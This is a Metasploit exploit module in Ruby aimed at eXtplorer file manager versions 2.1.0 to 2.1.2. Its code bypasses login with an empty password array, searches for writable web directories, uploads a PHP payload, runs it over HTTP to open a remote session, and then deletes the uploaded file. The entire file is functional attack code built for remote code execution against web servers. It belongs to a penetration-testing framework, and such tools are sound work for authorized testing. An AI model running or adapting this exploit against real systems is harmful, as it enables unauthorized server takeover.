##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "eXtplorer v2.1 Arbitrary File Upload Vulnerability",
      'Description'    => %q{
        This module exploits an authentication bypass vulnerability in eXtplorer
        versions 2.1.0 to 2.1.2 and 2.1.0RC5 when run as a standalone application.
        This application has an upload feature that allows an authenticated user
        with administrator roles to upload arbitrary files to any writable
        directory in the web root. This module uses an authentication bypass
        vulnerability to upload and execute a file.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Brendan Coles <bcoles[at]gmail.com>' # Discovery and exploit
        ],
      'References'     =>
        [
          [ 'OSVDB', '88751' ],
          [ 'BID', '57058' ],
          [ 'URL', 'http://itsecuritysolutions.org/2012-12-31-eXtplorer-v2.1-authentication-bypass-vulnerability' ],
          [ 'URL', 'http://extplorer.net/issues/105' ]
        ],
      'Payload'        =>
        {
        },
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          ['Automatic Targeting', { 'auto' => true }]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Dec 31 2012",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path to the web application', '/com_extplorer_2.1.0/']),
        OptString.new('USERNAME',  [true, 'The username for eXtplorer', 'admin'])
      ], self.class)
  end

  def check

    base  = target_uri.path
    base << '/' if base[-1, 1] != '/'
    peer  = "#{rhost}:#{rport}"

    # retrieve software version from ./extplorer.xml
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => "#{base}extplorer.xml"
      })

      if !res or res.code != 200
        return Exploit::CheckCode::Safe
      end

      if res.body =~ /<version>2\.1\.(0RC\d|0|1|2)<\/version>/
        return Exploit::CheckCode::Vulnerable
      end

      if res.body =~ /eXtplorer/
        return Exploit::CheckCode::Safe
      end

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      print_error("#{peer} - Connection failed")
    end
    return Exploit::CheckCode::Unknown

  end

  def on_new_session(client)
    if client.type == "meterpreter"
      client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
      client.fs.file.rm("#{@fname}")
    else
      client.shell_command_token("rm #{@fname}")
    end
  end

  def upload(base, dir, fname, file)

    data = Rex::MIME::Message.new
    data.add_part(file, 'application/x-httpd-php', nil, "form-data; name=\"userfile[0]\"; filename=\"#{fname}\"")
    data.add_part("on", nil, nil, "form-data; name=\"overwrite_files\"")
    data.add_part("%2f#{dir}", nil, nil, "form-data; name=\"dir\"")
    data.add_part("com_extplorer", nil, nil, "form-data; name=\"option\"")
    data.add_part("upload", nil, nil, "form-data; name=\"action\"")
    data.add_part("xmlhttprequest", nil, nil, "form-data; name=\"requestType\"")
    data.add_part("true", nil, nil, "form-data; name=\"confirm\"")

    data_post = data.to_s
    data_post = data_post.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => "#{base}index.php",
      'ctype'   => "multipart/form-data; boundary=#{data.bound}",
      'data'    => data_post,
      'cookie'  => datastore['COOKIE'],
    })

    return res
  end

  def auth_bypass(base, user)

    res   = send_request_cgi({
      'method' => 'POST',
      'uri'    => "#{base}index.php",
      'data'   => "option=com_extplorer&action=login&type=extplorer&username=#{user}&password[]=",
      'cookie' => datastore['COOKIE'],
    })
    return res

  end

  def exploit

    base  = target_uri.path
    base << '/' if base[-1, 1] != '/'
    @peer = "#{rhost}:#{rport}"
    @fname= rand_text_alphanumeric(rand(10)+6) + '.php'
    user  = datastore['USERNAME']
    datastore['COOKIE'] = "eXtplorer="+rand_text_alpha_lower(26)+";"

    # bypass auth
    print_status("#{@peer} - Authenticating as user (#{user})")
    res   = auth_bypass(base, user)
    if res and res.code == 200 and res.body =~ /Are you sure you want to delete these/
      print_status("#{@peer} - Authenticated successfully")
    else
      fail_with(Exploit::Failure::NoAccess, "#{@peer} - Authentication failed")
    end

    # search for writable directories
    print_status("#{@peer} - Retrieving writable subdirectories")
    begin
      res = send_request_cgi({
        'method'  => 'POST',
        'uri'     => "#{base}index.php",
        'cookie'  => datastore['COOKIE'],
        'data'    => "option=com_extplorer&action=getdircontents&dir=#{base}&sendWhat=dirs&node=ext_root",
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
    end
    if res and res.code == 200 and res.body =~ /\{'text':'([^']+)'[^\}]+'is_writable':true/
      dir = "#{base}#{$1}"
      print_status("#{@peer} - Successfully retrieved writable subdirectory (#{$1})")
    else
      dir = "#{base}"
      print_error("#{@peer} - Could not find a writable subdirectory.")
    end

    # upload PHP payload
    print_status("#{@peer} - Uploading PHP payload (#{payload.encoded.length.to_s} bytes) to #{dir}")
    php = %Q|<?php #{payload.encoded} ?>|
    begin
      res = upload(base, dir, @fname, php)
      if res and res.code == 200 and res.body =~ /'message':'Upload successful\!'/
        print_good("#{@peer} - File uploaded successfully")
      else
        fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Uploading PHP payload failed")
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
    end

    # search directories in the web root for the file
    print_status("#{@peer} - Searching directories for file (#{@fname})")
    begin
      res   = send_request_cgi({
        'method' => 'POST',
        'uri'    => "#{base}index.php",
        'data'   => "start=0&limit=10&option=com_extplorer&action=search&dir=#{base}&content=0&subdir=1&searchitem=#{@fname}",
        'cookie' => datastore['COOKIE'],
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
    end
    if res and res.code == 200 and res.body =~ /'dir':'\\\/([^']+)'/
      dir = $1.gsub('\\','')
      print_good("#{@peer} - Successfully found file")
    else
      print_error("#{@peer} - Failed to find file")
    end

    # retrieve and execute PHP payload
    print_status("#{@peer} - Executing payload (/#{dir}/#{@fname})")
    begin
      send_request_cgi({
        'method' => 'GET',
        'uri'    => "/#{dir}/#{@fname}"
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
    end
    if res and res.code != 200
      print_error("#{@peer} - Executing payload failed")
    end
  end
end
